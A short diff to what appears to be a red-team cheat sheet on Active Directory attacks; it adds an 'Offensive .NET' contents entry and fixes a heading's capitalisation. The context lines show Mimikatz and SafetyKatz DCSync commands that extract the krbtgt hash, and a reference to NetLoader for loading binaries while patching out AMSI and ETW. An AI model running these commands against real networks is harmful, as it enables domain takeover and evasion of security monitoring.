@@ -3,6 +3,7 @@
 * [Dumping LSASS](#Dumping-LSASS)
 * [Overpass The Hash](#Overpass-The-Hash)
 * [DC-Sync](#DC-Sync)
+* [Offensive .NET](#Offensive-.NET)
 * [Mimikatz](#Mimikatz) 
 * [Check Local Admin Access](#Check-Local-Admin-Access)  
 
@@ -107,7 +108,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
 
-## Offensive .net
+## Offensive .NET
 - https://github.com/Flangvik/NetLoader
 - Load binary from filepath or URL and patch AMSI & ETW while executing
 ```
